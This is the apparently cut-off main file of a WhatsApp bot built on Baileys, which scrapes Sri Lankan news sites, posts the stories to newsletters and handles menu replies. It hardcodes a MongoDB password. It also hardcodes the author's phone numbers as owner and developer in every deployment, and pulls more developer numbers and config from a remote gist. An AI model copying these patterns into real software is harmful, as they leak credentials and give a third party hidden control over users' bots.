const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    delay,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const FileType = require('file-type')
const mongoose = require('mongoose'); 
const moment = require('moment-timezone')
const l = console.log
var config = require('./config')
const pino = require("pino");
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
var prefix = config.PREFIX
var prefixRegex = config.PREFIX === "false" || config.PREFIX === "null" ? "^" : new RegExp('^[' + config.PREFIX + ']');
const {
    smsg,
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson,
    fetchBuffer,
    getFile
} = require('./lib/functions')
const {
    sms,
    downloadMediaMessage
} = require('./lib/msg')
var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get,updb,updfb } = require("./lib/database")
var { get_set , input_set } = require('./lib/set_db')        
const axios = require('axios')
const cheerio = require('cheerio');
 function genMsgId() {
  const lt = 'VajiraTech';
  const prefix = "3EB";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let randomText = prefix;

  for (let i = prefix.length; i < 22; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomText += characters.charAt(randomIndex);
  }   
 return randomText;
}    

const {
    File
} = require('megajs')
const path = require('path')
const msgRetryCounterCache = new NodeCache()
const ownerNumber = config.OWNER_NUMBER

const UserSchema = new mongoose.Schema({ 
 id : { type: String, required: true, unique: true }, 
 newsid : { type: String }, 
 }) 
 const news1 =  mongoose.model("news1", UserSchema) 
  
  
         //  async function XAsena() { 
             mongoose.connect('mongodb+srv://Jithula:Jithula@cluster0.i9f4p.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0') 
   .then(() => console.log('Connected Sucess!')); 


//===================SESSION============================
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if (config.SESSION_ID) {
      const sessdata = config.SESSION_ID.replace("VAJIRA-MD=", "")
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
      filer.download((err, data) => {
        if (err) throw err
        fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
          console.log("Session download completed !!")
        })
      })
    }
  }
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

//====================================
async function connectToWA() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })	
    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })

    conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {

//==================================================================

  
 async function news() { 
   /* let response = await fetch('https://app-97e3fc0d-9aec-4ff1-a518-b7b72a127d7c.cleverapps.io/api/latest'); 
     let data = await response.json(); */
     
  
        

const scrape = await fetch(`https://www.hirunews.lk/local-news.php?pageID=1`);
const $g = cheerio.load(await scrape.text());
const link = $g('body > div:nth-child(15) > div.row > div.col-sm-12.col-md-9.col-lg-9.section > div > div:nth-child(2) > div.column.left > a').attr('href');
const image = $g('body > div:nth-child(15) > div.row > div.col-sm-12.col-md-9.col-lg-9.section > div > div:nth-child(2) > div.column.left > div > a > img').attr('src');
const scrape2 = await fetch(link);
const $ = cheerio.load(await scrape2.text());
const title = $("body > div:nth-child(15) > center > h1").text().trim()
const desc = $("#article-phara2").text().trim()
//if(link) return { status: true, link, image, title, desc }
//else return { status: false }


let caption = `乂  *H I R U - N E W S*\n\n`
         caption += `	◦  *Title* : ${title}\n`
         caption += `	◦  *Desc* : ${desc}\n`
         caption += `	◦  *Link* : ${link}\n`
         

const url1 = `https://www.lankadeepa.lk/latest_news/1`;
const response = await axios.get(url1);  
const $x = cheerio.load(response.data);
const id = $x("div.m-t--10.p-b-40 > div:nth-child(1) > a").attr("href")  
const image1 = $x("div.m-t--10.p-b-40 > div:nth-child(1) > a > img").attr("src")  
const title1 = $x("div:nth-child(1) > div > h5:nth-child(1) > a").text().trim()   
const date = $x("div:nth-child(1) > div > span > span.f1-s-4.cl8.hov-cl10.trans-03.timec").text().trim()                
const response1 = await axios.get(id);  
 const $1 = cheerio.load(response1.data);
const desc1 = $1("div.header.inner-content.p-b-20").find("p").text().trim();
//if(link) return { status: true, link, image, title, date, desc}
// else return { status: false }

  
	  
        let caption1 = `乂  *ＬＡＮＫＡＤＥＥＰＡ - ＮＥＷＳ\n\n`
         caption1 += `	◦  *Title* : ${title1}\n`
	 caption1 += `	◦  *Time* : ${date}\n`
         caption1 += `	◦  *Link* : ${id}\n`
         caption1 += `	◦  *Desc* : ${desc1}\n`


		
         let newss = await news1.findOne({ id: '123' }) 
  
     if (!newss) { 
         await new news1({ id: '123', newsid: link, events:'true' }).save() 
           await conn.sendMessage(config.N_JID, {
text: caption,
 contextInfo: {
 mentionedJid: [ '' ],
 groupMentions: [],
 forwardingScore: 1111,   
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363260590125028@newsletter',
 newsletterName: "",
 serverMessageId: 127
 },
externalAdReply: { 
title: 'TC TEAM BY VAJIRA',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
 thumbnailUrl: `${image}` ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}})
	     
await conn.sendMessage(config.N_JID, {
text: caption1,
 contextInfo: {
 mentionedJid: [ '' ],
 groupMentions: [],
 forwardingScore: 1111,   
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363290448968237@newsletter',
 newsletterName: "TC TEAM BY VAJIRA",
 serverMessageId: 127
 },
externalAdReply: { 
title: 'TC TEAM BY VAJIRA',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
 thumbnailUrl: image1 ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}})         


	     
     } else { 
         if(newss.newsid == link )  
          { 
           return 
          } 
          else{ 
             await news1.updateOne({ id: '123' }, { newsid : link, events:'true'}) 
           await conn.sendMessage(config.N_JID, {
text: caption,
 contextInfo: {
 mentionedJid: [ '' ],
 groupMentions: [],
 forwardingScore: 1111,   
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363260590125028@newsletter',
 newsletterName: "",
 serverMessageId: 127
 },
externalAdReply: { 
title: 'TC TEAM BY VAJIRA',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
 thumbnailUrl: `${image}` ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}})
		  
await conn.sendMessage(config.N_JID, {
text: caption1,
 contextInfo: {
 mentionedJid: [ '' ],
 groupMentions: [],
 forwardingScore: 1111,   
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363290448968237@newsletter',
 newsletterName: "TC TEAM BY VAJIRA",
 serverMessageId: 127
 },
externalAdReply: { 
title: 'TC TEAM BY VAJIRA',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
 thumbnailUrl: image1 ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}})
         

		  
       }  
    }
 }
          
	 
 
 setInterval(news, 10000);  
//==================================================================
/*
async function dnews() { 


const url1 = `https://www.lankadeepa.lk/latest_news/1`;
const response = await axios.get(url1);  
const $x = cheerio.load(response.data);
const id = $x("div.m-t--10.p-b-40 > div:nth-child(1) > a").attr("href")  
const image = $x("div.m-t--10.p-b-40 > div:nth-child(1) > a > img").attr("src")  
const title = $x("div:nth-child(1) > div > h5:nth-child(1) > a").text().trim()   
const date = $x("div:nth-child(1) > div > span > span.f1-s-4.cl8.hov-cl10.trans-03.timec").text().trim()                
const response1 = await axios.get(id);  
 const $ = cheerio.load(response1.data);
const desc = $("div.header.inner-content.p-b-20").find("p").text().trim();
//if(link) return { status: true, link, image, title, date, desc}
// else return { status: false }

  
	  
        let caption1 = `乂  *ＬＡＮＫＡＤＥＥＰＡ - ＮＥＷＳ\n\n`
         caption1 += `	◦  *Title* : ${title}\n`
	 caption1 += `	◦  *Time* : ${date}\n`
         caption1 += `	◦  *Link* : ${id}\n`
         caption1 += `	◦  *Desc* : ${desc}\n`
         
  
         let newss = await news1.findOne({ id: '123' }) 
  
     if (!newss) { 
         await new news1({ id: '111', newsid: id, events:'true' }).save() 
           await conn.sendMessage(config.N_JID, {
text: caption1,
 contextInfo: {
 mentionedJid: [ '' ],
 groupMentions: [],
 forwardingScore: 1111,   
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363290448968237@newsletter',
 newsletterName: "TC TEAM BY VAJIRA",
 serverMessageId: 127
 },
externalAdReply: { 
title: 'TC TEAM BY VAJIRA',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
 thumbnailUrl: image ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}})
         
  
     } else { 
        
      if(newss.newsid == id )
          { 
           return 
          } 
          else{ 
            
           await news1.findOne({ id: '111' }, { newsid : id, events:'true'})
           await conn.sendMessage(config.N_JID, {
text: caption1,
 contextInfo: {
 mentionedJid: [ '' ],
 groupMentions: [],
 forwardingScore: 1111,   
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363290448968237@newsletter',
 newsletterName: "TC TEAM BY VAJIRA",
 serverMessageId: 127
 },
externalAdReply: { 
title: 'TC TEAM BY VAJIRA',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z" ,
 thumbnailUrl: image ,
renderLargerThumbnail: true,
showAdAttribution: false
}
}})
         
        

          } 
  
     } 
  
 } 
		   
setInterval(dnews, 10000);  
	*/
//==================================================================
		
            console.log('Installing plugins 🔌... ')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('Plugins installed ✅')
            console.log('Movie connected ✅')
await conn.sendMessage(config.OWNER_NUMBER + "@s.whatsapp.net", {
text: "*🎬 TC TEAM MOVIE-DL successfully connected* ✓\n\n\n> ◦ *Official GitHub* - ```https://github.com/VajiraTech```\n> ◦ ᴊᴏɪɴ ᴏᴜʀ sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ ᴠɪᴀ ᴛʏᴘᴇ: .joinsup\n*🎬 TC TEA MOVIE-DL ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴄʀᴇᴀᴛᴇᴅ ʙʏ • ᴛᴄ ᴛᴇᴀᴍ*",
contextInfo: {
externalAdReply: {
title: "🎬 TC TEAM MOVIE-DL 🎬\nSuccessfully Connected !",	
thumbnailUrl: 'https://pomf2.lain.la/f/l28p649.jpg',
sourceUrl: "",
mediaType: 1,
renderLargerThumbnail: true
}}}) 
    }
  })




        
      
//==================================================================

	


	
//==================================================================	

    conn.ev.on('creds.update', saveCreds)
    conn.ev.on('messages.upsert', async (mek) => {
      try {
            mek = mek.messages[0]
            if (!mek.message) return
	    var id_db = require('./lib/id_db')    
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
             //----------------AUTO STATUS VIEW-------------------------------
            if (config.AUTO_STATUS_READ === 'true') {
            if (mek.key && mek.key.remoteJid === 'status@broadcast') {
            await conn.readMessages([mek.key])
            }
            }
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            const m = sms(conn, mek)
	    var smg = m
            const type = getContentType(mek.message)
            const content = JSON.stringify(mek.message)
            const from = mek.key.remoteJid
            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []


//==================================Button================================
	      
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :(type == 'interactiveResponseMessage' ) ? mek.message.interactiveResponseMessage  && mek.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :(type == 'templateButtonReplyMessage' )? mek.message.templateButtonReplyMessage && mek.message.templateButtonReplyMessage.selectedId  : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  

//==================================NonButton================================
  	
await isbtnID(mek.message?.extendedTextMessage?.contextInfo?.stanzaId) &&
getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)
? getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)  : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''   
 
 //==================================================================



conn.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return conn.sendMessage(jid, { poll: { name, values, selectableCount }}) }
	      
 
	    var dbset = await  get_set('all')
config = await jsonConcat(config , dbset)    
	    prefix = config.PREFIX
var isCmd = body.startsWith(prefix)	    
var command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
var args = body.trim().split(/ +/).slice(1)
var q = args.join(' ')

    var body2 = ''
 if(smg.quoted && smg.quoted.fromMe && await id_db.check(smg.quoted.id)  ){
if (body.startsWith(prefix))  body = body.replace( prefix , '')
			     
			     
var id_body = await id_db.get_data( smg.quoted.id , body)
	
if (id_body.cmd) {
  isCmd = true
command = id_body.cmd.startsWith(prefix)?  id_body.cmd.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
args = id_body.cmd.trim().split(/ +/).slice(1)
q = args.join(' ')		
}
}
      console.log(command)
	      
            const isGroup = from.endsWith('@g.us')
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const pushname = mek.pushName || 'Sin Nombre'
	    const ownbot = '94711453361'
	    const isownbot = ownbot?.includes(senderNumber)
            const vajira = '94711453097'
            const isVajira = vajira?.includes(senderNumber)
	    const developers = '94711453361'
            const isbot = botNumber.includes(senderNumber)
	    const isdev = developers.includes(senderNumber) 	    
            let epaneda =  (await axios.get('https://gist.github.com/VajiraTech/bdba9d80f6da77ff57c7be7887fa97b8/raw')).data
            const epada = epaneda.split(",")	    
            const isDev = [ ...epada ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)
	    const botNumber2 = await jidNormalizedUser(conn.user.id)
            const isCreator = [ botNumber2 ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)	  
            const isMe = isbot ? isbot : isdev
            const isOwner = ownerNumber.includes(senderNumber) || isMe
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
            const groupName = isGroup ? groupMetadata.subject : ''
            const participants = isGroup ? await groupMetadata.participants : ''
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const isreaction = m.message.reactionMessage ? true : false
            const isAnti = (teks) => {
                let getdata = teks
                for (let i = 0; i < getdata.length; i++) {
                    if (getdata[i] === from) return true
                }
                return false
            }
            const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}




//==================================Nonbutton================================



function jsonConcat(o1, o2) {
 for (var key in o2) {
  o1[key] = o2[key];
 }
 return o1;
}	

        

    var dbset = await  get_set('all')
config = await jsonConcat(config , dbset)    
conn.replyad = async (teks) => {
  return await conn.sendMessage(from, { text: teks ,
contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://wa.me/94711453361" ,
thumbnailUrl: 'https://pomf2.lain.la/f/l28p649.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: mek })
}
const NON_BUTTON = true // Implement a switch to on/off this feature...
conn.buttonMessage2 = async (jid, msgData,quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n${mainNumber} | ${button.buttonText.displayText}\n`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://wa.me/94711453361" ,
thumbnailUrl: 'https://pomf2.lain.la/f/l28p649.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,
contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://wa.me/94711453361" ,
thumbnailUrl: 'https://pomf2.lain.la/f/l28p649.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

conn.replyList = async (from , list_reply , options) => {
function convertNumberList(sections) {
    let result = "";

    sections.forEach((section, sectionIndex) => {
        result += section.title? `${section.title}\n` : ''

        section.rows.forEach((row, rowIndex) => {
            result += `${row.title} || ${row.description}`;
            result += rowIndex === section.rows.length - 1 ? "" : "\n"; // Add newline unless it's the last row
        });

        result += sectionIndex === sections.length - 1 ? "" : "\n\n"; // Add extra newline unless it's the last section
    });

    return result;
}
if (!list_reply.sections) return false
list_reply[list_reply.caption? 'caption' : 'text'] = ( list_reply.title ? list_reply.title + '\n\n' : "" ) +  (list_reply.caption? list_reply.caption : list_reply.text) + '\n\n' + list_reply.buttonText + '\n\n' + await convertNumberList(list_reply.sections) + '\n\n' +list_reply.footer	
var t = { ...list_reply }
delete list_reply.sections
delete list_reply.footer
delete list_reply.buttonText
delete list_reply.title
const sentMessage = await conn.sendMessage(from, list_reply , options);	
const cmdArray = [];
t.sections.forEach((section) => {
    section.rows.forEach((row) => {
        cmdArray.push({ rowId: row.rowId, title: row.title });
    });
});
for ( let i = 0; i < cmdArray.length; i++) {	
await id_db.input_data(cmdArray[i].rowId ,cmdArray[i].title , sentMessage.key.id ) 
}}  
      
conn.buttonMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n${mainNumber} | ${button.buttonText.displayText}\n`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text || msgData.caption}\n🔢 Reply you want number,${result}\
\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://wa.me/94711453361" ,
thumbnailUrl: 'https://pomf2.lain.la/f/l28p649.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://wa.me/94711453361" ,
thumbnailUrl: 'https://pomf2.lain.la/f/l28p649.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}


conn.listMessage2 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n[${mainNumber}] ${section.title}\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `   ${subNumber} | ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage ,
contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://wa.me/94711453361" ,
thumbnailUrl: 'https://pomf2.lain.la/f/l28p649.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

conn.listMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n[${mainNumber}] ${section.title}\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `   ${subNumber} | ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage, 
contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://wa.me/94711453361" ,
thumbnailUrl: 'https://pomf2.lain.la/f/l28p649.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

    	    
conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}	    


	

      

//==================================Button================================

	      
            const ownerdata = (await axios.get('https://gist.github.com/VajiraTech/0138349a9fa6fffb9f8e840646d95fa3/raw')).data
            config.LOGO = ownerdata.imageurl
            config.BTN = ownerdata.button
	    config.CONTACT = ownerdata.contact
            config.FOOTER = ownerdata.footer
            config.BTNURL = ownerdata.buttonurl
	    config.CAPTION = ownerdata.caption  
            config.C_JID = ownerdata.newsletter
            config.T_LINE = ownerdata.titleline
            config.B_LINE = ownerdata.bodyline
            config.VAJIRA_WA = ownerdata.buttonurl2
            config.LOGO2 = ownerdata.imageurl2
            config.C_NAME = ownerdata.channel
	    config.O_NO = ownerdata.otherno 
		
            conn.edit = async (mek, newmg) => {
                await conn.relayMessage(from, {
                    protocolMessage: {
                        key: mek.key,
                        type: 14,
                        editedMessage: {
                            conversation: newmg
                        }
                    }
                }, {})
            }
            conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                let mime = '';
                let res = await axios.head(url)
                mime = res.headers['content-type']
                if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, {
                        video: await getBuffer(url),
                        caption: caption,
                        gifPlayback: true,
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
                let type = mime.split("/")[0] + "Message"
                if (mime === "application/pdf") {
                    return conn.sendMessage(jid, {
                        document: await getBuffer(url),
                        mimetype: 'application/pdf',
                        caption: caption,
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
                if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, {
                        image: await getBuffer(url),
                        caption: caption,
                        ...options
                    }, {
                        quoted: quoted,
                        ...options
                    })
                }
                if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, {
                        video: await getBuffer(url),
                        caption: caption,
